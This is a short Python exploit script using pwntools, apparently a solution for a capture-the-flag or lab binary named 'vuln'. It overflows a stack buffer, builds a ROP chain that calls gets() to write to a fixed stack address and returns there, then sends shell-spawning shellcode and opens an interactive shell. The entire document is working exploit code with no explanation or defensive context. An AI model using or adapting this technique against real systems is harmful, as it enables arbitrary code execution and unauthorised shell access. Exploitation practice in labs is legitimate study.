from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

stack_begin = 0x00007ffffffde000

rop = ROP(elf)
rop.raw(b'x' * 0x78)
rop.gets(stack_begin)
rop.raw(stack_begin)
p.sendline(rop.chain())

p.sendline(asm(shellcraft.sh()))
p.interactive()
